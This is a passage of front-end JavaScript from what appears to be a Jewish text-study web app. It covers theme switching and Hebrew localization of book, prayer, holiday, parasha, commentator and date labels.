                en: { light: 'Light', dark: 'Dark', system: 'System' },
                he: { light: 'בהיר', dark: 'כהה', system: 'מערכת' },
            };

            const locale = lang === 'he' ? 'he' : 'en';
            const prefix = locale === 'he' ? 'מראה' : 'Appearance';
            const modeLabel = modeLabels[locale]?.[pref] || modeLabels.en[pref] || 'Light';

            themeToggleLabel.textContent = `${prefix}: ${modeLabel}`;

            if (themeToggleBtn) {
                themeToggleBtn.dataset.theme = pref;
                themeToggleBtn.title = locale === 'he' ? 'שנה מצב תצוגה' : 'Change appearance mode';
            }
        }

        function setThemePreference(themePreference, options = {}) {
            const persist = options.persist !== false;
            appState.prefs.theme = normalizeThemePreference(themePreference);
            const apply = () => {
                applyThemePreferenceClass();
                updateThemeToggleUi();
            };
            // A switch the visitor made crosses over; applying a saved or system theme does not.
            if (persist && typeof withThemeFade === 'function') withThemeFade(apply);
            else apply();
            if (persist) {
                savePrefs();
            }
        }

        function cycleThemePreference() {
            const current = normalizeThemePreference(appState?.prefs?.theme);
            const currentIndex = THEME_PREFERENCE_OPTIONS.indexOf(current);
            const nextIndex = (currentIndex + 1) % THEME_PREFERENCE_OPTIONS.length;
            setThemePreference(THEME_PREFERENCE_OPTIONS[nextIndex]);
        }

        const systemThemeMediaQuery = window.matchMedia ? window.matchMedia('(prefers-color-scheme: dark)') : null;
        if (systemThemeMediaQuery) {
            const handleSystemThemeChange = () => {
                if (normalizeThemePreference(appState?.prefs?.theme) === 'system') {
                    applyThemePreferenceClass();
                    updateThemeToggleUi();
                }
            };

            systemThemeMediaQuery.addEventListener?.('change', handleSystemThemeChange);
        }

        const UI_TYPE_LABELS = {
            en: { text: 'Text', verse: 'Verse', prayer: 'Prayer', community: 'Community', ask: 'Ask', history: 'History' },
            he: { text: 'טקסט', verse: 'פסוק', prayer: 'תפילה', community: 'קהילה', ask: 'שאלה', history: 'היסטוריה' },
        };

        const CATEGORY_HE_MAP = {
            'Tanakh': 'תנ״ך',
            'Torah': 'תורה',
            'Prophets': 'נביאים',
            'Writings': 'כתובים',
            'Mishnah': 'משנה',
            'Talmud': 'תלמוד',
            'Talmud Bavli': 'תלמוד בבלי',
            'Halakhah': 'הלכה',
            'Liturgy': 'ליטורגיה',
            'Sefaria text': 'טקסט מספריא',
            'Sefaria liturgy': 'ליטורגיה מספריא',
            'Community customs': 'מנהגי קהילה',
            'Popular Torah alias': 'כינוי נפוץ מהתורה',
            'AI synthesis': 'סינתזת בינה מלאכותית',
            'Chasidut': 'חסידות',
            'Other Chasidut Works': 'כתבי חסידות נוספים',
        };

        const HOLIDAY_HE_MAP = {
            'Regular Day': 'יום חול',
            'Shabbat': 'שבת',
            'Pesach': 'פסח',
            'Passover': 'פסח',
            'Shavuot': 'שבועות',
            'Sukkot': 'סוכות',
            'Shemini Atzeret': 'שמיני עצרת',
            'Simchat Torah': 'שמחת תורה',
            'Rosh Hashanah': 'ראש השנה',
            'Yom Kippur': 'יום כיפור',
            'Purim': 'פורים',
            'Chanukah': 'חנוכה',
            'Hanukkah': 'חנוכה',
            'Tu BiShvat': 'ט״ו בשבט',
            'Lag BaOmer': 'ל״ג בעומר',
            'Tisha BAv': 'תשעה באב',
            'Yom HaAtzmaut': 'יום העצמאות',
            'Yom HaShoah': 'יום השואה',
            'Yom Yerushalayim': 'יום ירושלים',
            'Parashat HaShavua': 'פרשת השבוע',
        };

        const PARASHA_HE_MAP = {
            'Bereshit': 'בראשית', 'Noach': 'נח', 'Lech-Lecha': 'לך לך', 'Vayera': 'וירא',
            'Chayei Sara': 'חיי שרה', 'Toldot': 'תולדות', 'Vayetze': 'ויצא', 'Vayishlach': 'וישלח',
            'Vayeshev': 'וישב', 'Miketz': 'מקץ', 'Vayigash': 'ויגש', 'Vayechi': 'ויחי',
            'Shemot': 'שמות', 'Vaera': 'וארא', 'Bo': 'בא', 'Beshalach': 'בשלח',
            'Yitro': 'יתרו', 'Mishpatim': 'משפטים', 'Terumah': 'תרומה', 'Tetzaveh': 'תצוה',
            'Ki Tisa': 'כי תשא', 'Vayakhel': 'ויקהל', 'Pekudei': 'פקודי',
            'Vayikra': 'ויקרא', 'Tzav': 'צו', 'Shemini': 'שמיני', 'Tazria': 'תזריע',
            'Metzora': 'מצורע', 'Achrei Mot': 'אחרי מות', 'Kedoshim': 'קדושים', 'Emor': 'אמור',
            'Behar': 'בהר', 'Bechukotai': 'בחוקותי', 'Bamidbar': 'במדבר', 'Naso': 'נשא',
            'Behaalotecha': 'בהעלותך', 'Shelach': 'שלח', 'Korach': 'קרח', 'Chukat': 'חקת',
            'Balak': 'בלק', 'Pinchas': 'פינחס', 'Matot': 'מטות', 'Masei': 'מסעי',
            'Devarim': 'דברים', 'Vaetchanan': 'ואתחנן', 'Eikev': 'עקב', 'Reeh': 'ראה',
            'Shoftim': 'שופטים', 'Ki Teitzei': 'כי תצא', 'Ki Tavo': 'כי תבוא', 'Nitzavim': 'נצבים',
            'Vayelech': 'וילך', 'Haazinu': 'האזינו', 'Vezot Haberakhah': 'וזאת הברכה',
            // Aliases for Hebcal's transliteration of the same parashot (calendar events).
            'Vayeilech': 'וילך', 'Behaalotcha': 'בהעלותך', 'Shlach': 'שלח',
            'Vayetzei': 'ויצא', 'Nasso': 'נשא', 'Shmini': 'שמיני',
        };

        const STATIC_HEBREW_TEXT_MAP = {
            'Save Current': 'שמור נוכחי',
            'Hide Sidebars': 'הסתר סרגלים',
            'Show Sidebars': 'הצג סרגלים',
            'Sign In': 'התחבר',
            'Sign Out': 'התנתק',
            'Terms of Service': 'תנאי השירות',
            'Privacy Policy': 'מדיניות הפרטיות',
            'Torah (5 Books)': 'תורה (חמשה חומשי תורה)',
            'Parashat HaShavua': 'פרשת השבוע',
            'Genesis (Bereishit)': 'בראשית',
            'Exodus (Shemot)': 'שמות',
            'Leviticus (Vayikra)': 'ויקרא',
            'Numbers (Bamidbar)': 'במדבר',
            'Deuteronomy (Devarim)': 'דברים',
            "Prophets (Nevi'im)": 'נביאים',
            'Writings': 'כתובים',
            'Joshua (Yehoshua)': 'יהושע',
            'Judges (Shoftim)': 'שופטים',
            'I Samuel (Shmuel I)': 'שמואל א׳',
            'II Samuel (Shmuel II)': 'שמואל ב׳',
            'I Kings (Melakhim I)': 'מלכים א׳',
            'II Kings (Melakhim II)': 'מלכים ב׳',
            'Isaiah (Yeshayahu)': 'ישעיהו',
            'Jeremiah (Yirmiyahu)': 'ירמיהו',
            'Ezekiel (Yechezkel)': 'יחזקאל',
            'Trei Asar (The Twelve)': 'תרי עשר',
            'Hoshea (Hosha)': 'הושע',
            'Yoel': 'יואל',
            'Ovadiah (Obadiah)': 'עובדיה',
            'Yonah (Jonah)': 'יונה',
            'Nachum (Nahum)': 'נחום',
            'Habakkuk (Chavakuk)': 'חבקוק',
            'Tzefaniah (Zephaniah)': 'צפניה',
            'Chaggai (Haggai)': 'חגי',
            'Zechariah (Zechariah)': 'זכריה',
            'Malachi (Malakhi)': 'מלאכי',
            'Hosea': 'הושע',
            'Joel': 'יואל',
            'Amos': 'עמוס',
            'Obadiah': 'עובדיה',
            'Jonah': 'יונה',
            'Micah': 'מיכה',
            'Nahum': 'נחום',
            'Habakkuk': 'חבקוק',
            'Zephaniah': 'צפניה',
            'Haggai': 'חגי',
            'Zechariah': 'זכריה',
            'Malachi': 'מלאכי',
            'Psalms (Tehillim)': 'תהילים',
            'Proverbs (Mishlei)': 'משלי',
            'Job (Iyov)': 'איוב',
            'Song of Songs (Shir HaShirim)': 'שיר השירים',
            'Ruth': 'רות',
            'Lamentations (Eicha)': 'איכה',
            'Ecclesiastes (Kohelet)': 'קהלת',
            'Esther (Megillat Esther)': 'אסתר',
            'Daniel (Daniyel)': 'דניאל',
            'Ezra': 'עזרא',
            'Nehemiah': 'נחמיה',
            'I Chronicles': 'דברי הימים א׳',
            'II Chronicles': 'דברי הימים ב׳',
            'Berakhot (Blessings)': 'ברכות',
            'Shabbat': 'שבת',
            'Pesachim (Passover)': 'פסחים',
            'Sukkah': 'סוכה',
            'Yom Tov': 'יום טוב',
            'Rosh Hashanah': 'ראש השנה',
            'Taanit (Fasting)': 'תענית',
            'Pirkei Avot (Ethics)': 'פרקי אבות',
            'Niddah (Family Purity)': 'נדה',
            'Berakhot': 'ברכות',
            'Pesachim': 'פסחים',
            'Sanhedrin': 'סנהדרין',
            'Kiddushin': 'קידושין',
            'Gittin': 'גיטין',
            'Niddah': 'נדה',
            'Shulchan Arukh OC': 'שולחן ערוך או״ח',
            'Shulchan Arukh YD': 'שולחן ערוך יו״ד',
            'Shulchan Arukh EH': 'שולחן ערוך אה״ע',
            'Shulchan Arukh CM': 'שולחן ערוך חו״מ',
            'Mishneh Torah': 'משנה תורה',
            'Kitzur Shulchan Arukh': 'קיצור שולחן ערוך',
            'Mishnah Berurah': 'משנה ברורה',
            'Torah Commentaries': 'מפרשי התורה',
            'Writings (Ketuvim)': 'כתובים',
            'Rashi on Torah': 'רש"י על התורה',
            'Ibn Ezra on Torah': 'אבן עזרא על התורה',
            'Ramban on Torah': 'רמב"ן על התורה',
            'Sforno on Torah': 'ספורנו על התורה',
            'Kli Yakar on Torah': 'כלי יקר על התורה',
            'Seder Zeraim': 'סדר זרעים',
            'Seder Moed': 'סדר מועד',
            'Seder Nashim': 'סדר נשים',
            'Seder Nezikin': 'סדר נזיקין',
            'Seder Kodashim': 'סדר קדשים',
            'Seder Tahorot': 'סדר טהרות',
            'Layout': 'פריסה',
            'Text Size': 'גודל טקסט',
            'Density': 'ריווח',
            'Bilingual': 'דו-לשוני',
            'English': 'אנגלית',
            'Hebrew': 'עברית',
            'Selected Passage Tools': 'כלים לקטע שנבחר',
            'Highlight a passage to load linked commentaries. Highlight one word to see its meaning.': 'סמן קטע כדי לטעון מפרשים מקושרים. סמן מילה אחת כדי לראות את פירושה.',
            'Answer': 'תשובה',
            'Trust & Method': 'אמינות ושיטה',
            'Fallback Summary': 'סיכום חלופי',
            'Primary Sources': 'מקורות ראשוניים',
            'Community Traditions': 'מסורות קהילתיות',
            'Encyclopedia Context': 'הקשר אנציקלופדי',
            'Source Name': 'שם המקור',
            'Laws of blessings and prayer': 'הלכות ברכות ותפילה',
            'Laws of berakhot and prayer': 'הלכות ברכות ותפילה',
            'Abridged code of Jewish law': 'קיצור ההלכה היהודית',
            'Laws of Torah study': 'הלכות תלמוד תורה',
            'Morning conduct': 'הנהגת הבוקר',
            'First page of Talmud Bavli': 'הדף הראשון בתלמוד הבבלי',
            'Ethics of the Fathers': 'מסכת אבות',
            'Laws of Pesach': 'הלכות פסח',
            'Laws of Shabbat': 'הלכות שבת',
            'The journey out of Egypt': 'יציאת מצרים',
            'The beginning of creation': 'תחילת הבריאה',
            'Proverbs of Solomon': 'משלי שלמה',
            'Psalms of David': 'תהילים לדוד',
            'Browse Jewish Library': 'עיון בספרייה היהודית',
            'Text Library (Browse Categories)': 'ספריית טקסטים',
            'All Topics & Texts': 'כל הנושאים והטקסטים',
            'Ashkenaz Community Customs': 'מנהגי קהילת אשכנז',
            'Siddur Sefard': 'סידור ספרד',
            'Mishneh Torah, Forbidden Foods': 'משנה תורה, הלכות מאכלות אסורות',
        };

        const PRAYER_HE_MAP = {
            'Upon Arising': 'ברכות השחר',
            'Weekday Shacharit': 'שחרית (ימי חול)',
            'Weekday Mincha': 'מנחה (ימי חול)',
            'Weekday Maariv': 'מעריב (ימי חול)',
            'Shabbat Shacharit': 'שחרית של שבת',
            'Shabbat Mincha': 'מנחה של שבת',
            'Kiddush': 'קידוש',
            'Havdalah': 'הבדלה',
            'Bedtime Shema': 'קריאת שמע שעל המיטה',
            'Kiddush Levanah': 'קידוש לבנה',
            'Holiday Prayers': 'תפילות חגים',
            'Shacharit (Morning)': 'שחרית',
            'Mincha (Afternoon)': 'מנחה',
            'Maariv (Evening)': 'מעריב',
            'Shabbat Prayers': 'תפילות שבת',
            'Kiddush & Havdalah': 'קידוש והבדלה',
            'Morning Blessings': 'ברכות הבוקר',
        };

        // Keys are every spelling the app meets: the community picker's option
        // values and the `name` of each customs/*.json file (the AI answer's
        // customs list carries the latter, e.g. 'Ashkenazi', 'Bukharan').
        const COMMUNITY_HE_MAP = {
            'Ashkenaz': 'אשכנז',
            'Ashkenazi': 'אשכנז',
            'Sefardic': 'ספרדי',
            'Sephardi': 'ספרדי',
            'Iraqi': 'עיראקי',
            'Syrian': 'סורי',
            'Yemenite': 'תימני',
            'Moroccan': 'מרוקאי',
            'Kavkazi': 'קווקזי',
            'Mountain (Kavkazi)': 'קווקזי',
            'Israeli': 'ישראלי',
            'Bukharian': 'בוכרי',
            'Bukharan': 'בוכרי',
            'Persian': 'פרסי',
            'Ethiopian': 'אתיופי',
            'Georgian': 'גרוזיני',
            'Greek-Romaniote': 'רומניוטי',
            'Greek / Romaniote': 'רומניוטי',
            'turkish-ottoman-sefardic': 'טורקי-עות׳מאני',
            'Turkish-Ottoman Sefardic': 'טורקי-עות׳מאני',
            'Turkish-Ottoman': 'טורקי-עות׳מאני',
        };

        const COMMENTARY_AUTHOR_HE_MAP = {
            'Rashi': 'רש"י',
            'Ibn Ezra': 'אבן עזרא',
            'Ramban': 'רמב"ן',
            'Sforno': 'ספורנו',
            'Kli Yakar': 'כלי יקר',
            'Rashbam': 'רשב"ם',
            'Shadal': 'שד"ל',
            'Metsudat David': 'מצודת דוד',
            'Metsudat Zion': 'מצודת ציון',
            'Malbim': 'מלבי"ם',
            'Abarbanel': 'אברבנאל',
            'Haamek Davar': 'העמק דבר',
            'HaKtav VeHaKabbalah': 'הכתב והקבלה',
            'HaKtav VeHakabalah': 'הכתב והקבלה',
            'Mizrachi': 'מזרחי',
            'Or HaChaim': 'אור החיים',
            'Or HaChayim': 'אור החיים',
            'Rabbeinu Bahya': 'רבנו בחיי',
            'Rabbeinu Bachya': 'רבנו בחיי',
            'Daat Zekenim': 'דעת זקנים',
            'Daat Zekenim MiBaalei HaTosafot': 'דעת זקנים מבעלי התוספות',
            'Bekhor Shor': 'בכור שור',
            'Chizkuni': 'חזקוני',
            'Gur Aryeh': 'גור אריה',
            'Siftei Chakhamim': 'שפתי חכמים',
            'Ralbag': 'רלב"ג',
            'Radak': 'רד"ק',
            'Rashi on Torah': 'רש"י על התורה',
            'Tosafot': 'תוספות',
            'Bartenura': 'ברטנורא',
            'Bertinoro': 'ברטנורא',
            'Maharsha': 'מהרש"א',
        };

        const TALMUD_SECTION_HE_MAP = {
            'MEEIMATAI': 'מאימתי',
            'HAYAH KOREI': 'היה קורא',
            'MI SHEMETU': 'מי שמתו',
            'TEFILLAT HASHACHAR': 'תפילת השחר',
        };

        function getHebrewStaticLabel(text) {
            const key = String(text || '').replace(/\s+/g, ' ').trim();
            if (!key) return null;
            return STATIC_HEBREW_TEXT_MAP[key] || null;
        }

        function translateStaticLabel(text) {
            const key = String(text || '').replace(/\s+/g, ' ').trim();
            if (!key) return key;
            if (!isHebrewMode()) return key;
            return getHebrewStaticLabel(key) || key;
        }

        const PRAYER_TITLE_HE_KEYWORDS = [
            [/edot\s*ha\s*mizrach/gi, 'עדות המזרח'],
            [/ashkenaz(?:ic|i)?/gi, 'אשכנז'],
            [/sephard(?:ic|i)?/gi, 'ספרד'],
            [/sefard(?:ic|i)?/gi, 'ספרד'],
            [/weekday/gi, 'ימי חול'],
            [/shabbat/gi, 'שבת'],
            [/holidays?/gi, 'חגים'],
            [/holiday/gi, 'חג'],
            [/siddur/gi, 'סידור'],
            [/machzor/gi, 'מחזור'],
            [/haggadah/gi, 'הגדה'],
            [/linear/gi, 'ליניארי'],
            [/shacharit/gi, 'שחרית'],
            [/mincha/gi, 'מנחה'],
            [/maariv|arvit/gi, 'מעריב'],
            [/kiddush/gi, 'קידוש'],
            [/havdalah/gi, 'הבדלה'],
            [/selichot/gi, 'סליחות'],
            [/hallel/gi, 'הלל'],
            [/yizkor/gi, 'יזכור'],
            [/akdamut\s*milin/gi, 'אקדמות מילין'],
            [/hadran/gi, 'הדרן'],
            [/for\s*tanakh/gi, 'לתנ״ך'],
            [/kabbalat/gi, 'קבלת'],
            [/keter\s*malkhut/gi, 'כתר מלכות'],
            [/ketubah/gi, 'כתובה'],
            [/\btexts?\b/gi, 'טקסטים'],
            [/lekha\s*dodi/gi, 'לכה דודי'],
            [/perek\s*shirah/gi, 'פרק שירה'],
            [/shalom\s*aleichem/gi, 'שלום עליכם'],
            [/shir\s*ha\s*kavod/gi, 'שיר הכבוד'],
            [/tikkun\s*ha\s*klali/gi, 'תיקון הכללי'],
            [/unetaneh\s*tokef/gi, 'ונתנה תוקף'],
            [/yedid\s*nefesh/gi, 'ידיד נפש'],
            [/pesach|passover/gi, 'פסח'],
            [/rosh\s*hashanah/gi, 'ראש השנה'],
            [/yom\s*kippur/gi, 'יום כיפור'],
            [/sukkot/gi, 'סוכות'],
            [/shavuot/gi, 'שבועות'],
        ];

        function getHebrewBookDisplayName(bookName) {
            const raw = String(bookName || '').trim();
            if (!raw) return raw;

            const normalized = normalizeChapterGridBookName(raw);
            return getHebrewStaticLabel(withHebrewBookName(normalized))
                || getHebrewStaticLabel(normalized)
                || getHebrewStaticLabel(raw)
                || normalized;
        }

        // Gematria for Hebrew-mode labels ("5" -> "ה׳"); digits pass through
        // if static/js/hebrew-ref.js somehow didn't load.
        function hebrewNumber(value) {
            return hebrewRef ? hebrewRef.hebrewNumeral(Number(value)) : String(value);
        }

        function localizeReferenceLabel(value) {
            const raw = String(value || '').replace(/\s+/g, ' ').trim();
            if (!raw || !isHebrewMode()) return raw;

            const direct = getHebrewStaticLabel(raw);
            if (direct) return direct;

            const talmudMatch = TALMUD_REF_RE.exec(raw);
            if (talmudMatch) {
                const book = getHebrewBookDisplayName(talmudMatch[1]);
                const dafLine = talmudMatch[4] ? `:${talmudMatch[4]}` : '';
                const dafToken = localizeDafToken(`${talmudMatch[2]}${talmudMatch[3]}${dafLine}`);
                return `${book} ${dafToken}`;
            }

            const chapterRangeMatch = CHAPTER_RANGE_REF_RE.exec(raw);
            if (chapterRangeMatch) {
                const book = getHebrewBookDisplayName(chapterRangeMatch[1]);
                const startChapter = hebrewNumber(chapterRangeMatch[2]);
                const startVerse = hebrewNumber(chapterRangeMatch[3]);
                const endChapter = hebrewNumber(chapterRangeMatch[4]);
                const endVerse = hebrewNumber(chapterRangeMatch[5]);
                return `${book} ${startChapter}:${startVerse}-${endChapter}:${endVerse}`;
            }

            const chapterMatch = CHAPTER_VERSE_REF_RE.exec(raw);
            if (chapterMatch) {
                const book = getHebrewBookDisplayName(chapterMatch[1]);
                const chapter = hebrewNumber(chapterMatch[2]);
                const verse = chapterMatch[3] ? `:${hebrewNumber(chapterMatch[3])}` : '';
                return `${book} ${chapter}${verse}`;
            }

            const plainBook = getHebrewBookDisplayName(raw);
            if (plainBook && plainBook !== raw) {
                return plainBook;
            }

            return raw;
        }

        function getPrayerDisplayName(name) {
            const raw = String(name || '').trim();
            if (!raw) return raw;
            if (!isHebrewMode()) return raw;

            const direct = PRAYER_HE_MAP[raw] || getHebrewStaticLabel(raw);
            if (direct) return direct;

            let localized = raw;
            PRAYER_TITLE_HE_KEYWORDS.forEach(([pattern, replacement]) => {
                localized = localized.replace(pattern, replacement);
            });
            return localized.replace(/\s{2,}/g, ' ').trim();
        }

        function localizeLooseHebrewPhrase(text) {
            const raw = String(text || '').replace(/\s+/g, ' ').trim();
            if (!raw || !isHebrewMode()) return raw;

            const direct = getHebrewStaticLabel(raw);
            if (direct) return direct;

            let localized = raw;
            PRAYER_TITLE_HE_KEYWORDS.forEach(([pattern, replacement]) => {
                localized = localized.replace(pattern, replacement);
            });

            localized = localized
                .replace(/\bLaws of\b/gi, 'הלכות')
                .replace(/\bin depth\b/gi, 'בעיון')
                .replace(/Whoever\s+saves\s+one\s+life(?:\.\.\.)?/gi, 'כל המקיים נפש אחת...')
                .replace(/First\s+page\s+of\s+Talmud\s+Bavli/gi, 'הדף הראשון בתלמוד הבבלי');

            return localized.replace(/\s{2,}/g, ' ').trim();
        }

        function getCommunityDisplayName(name) {
            const raw = String(name || '').trim();
            if (!raw) return raw;
            if (!isHebrewMode()) return raw;
            return COMMUNITY_HE_MAP[raw] || raw;
        }

        function getCommentaryAuthorDisplayName(name) {
            const raw = String(name || '').replace(/\s+/g, ' ').trim();
            if (!raw || !isHebrewMode()) return raw;

            const normalized = raw
                .replaceAll(/[’']/g, "'")
                .replace(/\s+/g, ' ')
                .trim();

            return COMMENTARY_AUTHOR_HE_MAP[raw]
                || COMMENTARY_AUTHOR_HE_MAP[normalized]
                || getHebrewStaticLabel(raw)
                || getHebrewStaticLabel(normalized)
                || localizeLooseHebrewPhrase(raw)
                || raw;
        }

        function localizeDafToken(token) {
            const raw = String(token || '').trim();
            const match = /^(\d+)([ab])(?::(\d+))?$/i.exec(raw);
            if (!match) return raw;
            const side = match[2].toLowerCase() === 'a' ? 'ע״א' : 'ע״ב';
            const line = match[3] ? `:${hebrewNumber(match[3])}` : '';
            return `${hebrewNumber(match[1])} ${side}${line}`;
        }

        function localizeTalmudSectionLabel(label) {
            const raw = String(label || '').replace(/\s+/g, ' ').trim();
            if (!raw || !isHebrewMode()) return raw;
            const canonical = raw.toUpperCase();
            return TALMUD_SECTION_HE_MAP[canonical]
                || localizeLooseHebrewPhrase(raw)
                || raw;
        }

        // ref -> { heRef, en, he } from the links payload: Sefaria's own
        // Hebrew ref and the commentator's short title in both languages.
        const commentaryRefMeta = new Map();

        function localizeCommentaryReferenceLabel(ref) {
            const raw = String(ref || '').replace(/\s+/g, ' ').trim();
            if (!raw || !isHebrewMode()) return raw;
            const sefariaHeRef = commentaryRefMeta.get(raw)?.heRef;
            if (sefariaHeRef) return sefariaHeRef;

            const onMatch = COMMENTARY_ON_RE.exec(raw);
            if (onMatch) {
                const author = getCommentaryAuthorDisplayName(onMatch[1]);
                const target = localizeReferenceLabel(onMatch[2]);
                return `${author} על ${target}`;
            }

            return localizeReferenceLabel(raw)
                || localizeLooseHebrewPhrase(raw)
                || raw;
        }

        function normalizeHebrewDateDisplay(rawDate) {
            const raw = String(rawDate || '').replace(/\s+/g, ' ').trim();
            if (!raw) return raw;
            if (!isHebrewMode()) return raw;

            if (containsHebrewLetters(raw)) {
                return raw;
            }

            const monthMap = window.ShelahHebrewRef?.HEBREW_MONTHS || {};

            // Longest first, so "Adar II" isn't read as "Adar" + "II".
            let localized = raw;
            Object.entries(monthMap)
                .sort(([a], [b]) => b.length - a.length)
                .forEach(([monthEn, monthHe]) => {
                    localized = localized.replace(new RegExp(String.raw`\b${monthEn}\b`, 'gi'), monthHe);
                });

            // "15 Tishrei 5787" (or "Tishrei 5787 15") -> "ט״ו בתשרי תשפ״ז".
            const numeral = window.ShelahHebrewRef?.hebrewNumeral || String;
            const dmy = /^(\d{1,2})\s+([^\d\s]+(?:\s+[^\d\s]+)*)\s+(\d{4})$/.exec(localized);
            const mdy = /^([^\d\s]+(?:\s+[^\d\s]+)*)\s+(\d{4})\s+(\d{1,2})$/.exec(localized);
            if (dmy || mdy) {
                const [day, month, year] = dmy ? [dmy[1], dmy[2], dmy[3]] : [mdy[3], mdy[1], mdy[2]];
                return `${numeral(Number(day))} ב${month.trim()} ${numeral(Number(year))}`;
            }

            return localized;
        }

        // The header's Hebrew date is the zmanim location's: /api/zmanim
        // works it out in that place's timezone and rolls it over at its
        // sunset. /api/daily-study's server-side date only fills in until
        // the zmanim answer arrives.
        let hebrewDateFromLocation = false;
        function setLocationHebrewDate(hebrewDate) {
            const dateEl = document.getElementById('hebrewDateDisplay');
            const value = String(hebrewDate || '').trim();
            if (!dateEl || !value) return;
            hebrewDateFromLocation = true;
            if (dateEl.dataset.en === value) return;
            dateEl.dataset.en = value;
            delete dateEl.dataset.he;
            refreshHebrewDateDisplay();
            syncHebrewDateMobilePosition();
        }

        function refreshHebrewDateDisplay(lang = getCurrentLanguage()) {
            const dateEl = document.getElementById('hebrewDateDisplay');
            if (!dateEl) return;

            if (!dateEl.dataset.en) {
                dateEl.dataset.en = String(dateEl.textContent || '').trim();
            }

            if (lang === 'he') {
                dateEl.dataset.he = normalizeHebrewDateDisplay(dateEl.dataset.en);
                dateEl.textContent = dateEl.dataset.he || dateEl.dataset.en;
                dateEl.setAttribute('dir', 'rtl');
                return;
            }

            dateEl.textContent = dateEl.dataset.en;
            dateEl.setAttribute('dir', 'ltr');
        }

        function getShelfDisplayLabel(item) {
            const fallback = String(item?.label || item?.value || '').trim();
            if (!fallback) return fallback;
            if (!isHebrewMode()) return fallback;

            const type = String(item?.type || '').trim();
            if (type === 'prayer') {
                return getPrayerDisplayName(fallback);
            }
            if (type === 'community') {
                return getCommunityDisplayName(fallback);
            }
            if (type === 'text') {
                return localizeCommentaryReferenceLabel(fallback)
                    || localizeReferenceLabel(fallback)
                    || localizeLooseHebrewPhrase(fallback)
                    || fallback;
            }

            return getHebrewStaticLabel(fallback) || localizeLooseHebrewPhrase(fallback) || fallback;
        }

        function applyStaticHebrewFallbackTranslations(lang = getCurrentLanguage()) {
            const selectors = [
                '.navigator-pane summary',
                '.navigator-pane button',
                '#textsMenuModal .space-y-2 > button',
                '#readerLayoutSelect option',
                '.source-title span',
                '.source-link',
            ];

            document.querySelectorAll(selectors.join(',')).forEach((el) => {
                if (!el) return;
                if (el.childElementCount > 0 && el.tagName !== 'OPTION') return;

                const englishLabel = String(el.dataset.en || el.textContent || '').replace(/\s+/g, ' ').trim();
                if (!englishLabel) return;

                const hebrewLabel = getHebrewStaticLabel(englishLabel)
                    || (lang === 'he' ? localizeLooseHebrewPhrase(englishLabel) : null);
                if (!hebrewLabel || hebrewLabel === englishLabel) return;

                if (!el.dataset.en) {
                    el.dataset.en = englishLabel;
                }
                el.dataset.he = hebrewLabel;
                el.textContent = lang === 'he' ? hebrewLabel : el.dataset.en;
            });

            if (settingsMenuBtn) {
                const settingsLabel = lang === 'he' ? 'פתח תפריט הגדרות' : 'Open settings menu';
                settingsMenuBtn.title = settingsLabel;
                settingsMenuBtn.setAttribute('aria-label', settingsLabel);
            }
        }

        function translateCategoryToken(token) {
            if (!isHebrewMode()) return token;
            return CATEGORY_HE_MAP[token] || token;
        }

        function translateCategoryPath(path) {
            const text = String(path || '').trim();
            if (!text || !isHebrewMode()) return text;
            const parts = text.split(/[>›]/).map(part => part.trim()).filter(Boolean);
            if (!parts.length) return translateCategoryToken(text);
            return parts.map(translateCategoryToken).join(' › ');
        }

        function translateSuggestionSubtitle(subtitle, type) {
            if (!isHebrewMode()) return subtitle || '';

            if (type === 'ask') return 'סינתזת בינה מלאכותית';
            if (type === 'community' && (!subtitle || subtitle.toLowerCase().includes('community'))) {
                return 'מנהגי קהילה';
            }
            if (type === 'prayer' && (!subtitle || subtitle.toLowerCase().includes('liturgy'))) {
                return 'ליטורגיה מספריא';
            }

            return translateCategoryPath(subtitle || '');
        }

        // Special Shabbatot named for their maftir/haftarah rather than the weekly
        // parasha (e.g. "Shabbat Shuva"); must run before the generic Shabbat
        // replacement below or the English suffix is stranded after "שבת ".
        const SPECIAL_SHABBAT_HE_MAP = {
            'Shabbat Chazon': 'שבת חזון',
            'Shabbat HaChodesh': 'שבת החודש',
            'Shabbat HaGadol': 'שבת הגדול',
            'Shabbat Nachamu': 'שבת נחמו',
            'Shabbat Parah': 'שבת פרה',
            'Shabbat Shekalim': 'שבת שקלים',
            'Shabbat Shirah': 'שבת שירה',
            'Shabbat Shuva': 'שבת שובה',
            'Shabbat Zachor': 'שבת זכור',
        };

        const HOLIDAY_MONTH_HE_MAP = {
            'Nisan': 'ניסן', 'Iyyar': 'אייר', 'Iyar': 'אייר', 'Sivan': 'סיוון', 'Tamuz': 'תמוז',
            'Av': 'אב', 'Elul': 'אלול', 'Tishrei': 'תשרי', 'Cheshvan': 'חשוון', 'Kislev': 'כסלו',
            'Tevet': 'טבת', 'Sh[’\']vat': 'שבט', 'Shevat': 'שבט', 'Adar': 'אדר',
        };

        // Mode-independent core of translateHolidayName(), split out so callers
        // that need a Hebrew name to *cache* (e.g. the parasha quick-link's
        // data-he attribute, read back after a later language toggle) can force
        // the translation regardless of the UI language active right now.
        function holidayNameToHebrew(name) {
            const raw = String(name || '').trim();
            if (!raw) return raw;
            const direct = HOLIDAY_HE_MAP[raw];
            if (direct) return direct;

            let result = raw;
            Object.entries(SPECIAL_SHABBAT_HE_MAP).forEach(([en, he]) => {
                result = result.replace(new RegExp(en, 'gi'), he);
            });

            result = result
                .replace(/Parashat\s+([a-z’'-]+(?:\s+[a-z’'-]+)*)(?=\s*$)/i, (_m, names) => {
                    const clean = (s) => s.trim().replaceAll(/[’']/g, '');
                    const whole = PARASHA_HE_MAP[clean(names)];
                    if (whole) return `פרשת ${whole}`;
                    const he = names.split('-')
                        .map((part) => PARASHA_HE_MAP[clean(part)] || part.trim())
                        .join('-');
                    return `פרשת ${he}`;
                })
                .replace(/Mevarchim\s+Chodesh/gi, 'מברכים חודש')
                .replace(/Rosh\s+Chodesh/gi, 'ראש חודש')
                .replace(/Chol\s+HaMoed/gi, 'חול המועד')
                .replace(/Shmini\s+Atzeret/gi, 'שמיני עצרת')
                .replace(/Simchat\s+Torah/gi, 'שמחת תורה')
                .replace(/Pesach\s+Sheni/gi, 'פסח שני')
                .replace(/Pesach|Passover/gi, 'פסח')
                .replace(/Sukkot/gi, 'סוכות')
                .replace(/Shavuot/gi, 'שבועות')
                .replace(/Shushan\s+Purim/gi, 'שושן פורים')
                .replace(/Purim/gi, 'פורים')
                .replace(/Hanukkah|Chanukah/gi, 'חנוכה')
                .replace(/Yom\s+Kippur/gi, 'יום כיפור')
                .replace(/Rosh\s+Hashan(?:ah|a)/gi, 'ראש השנה')
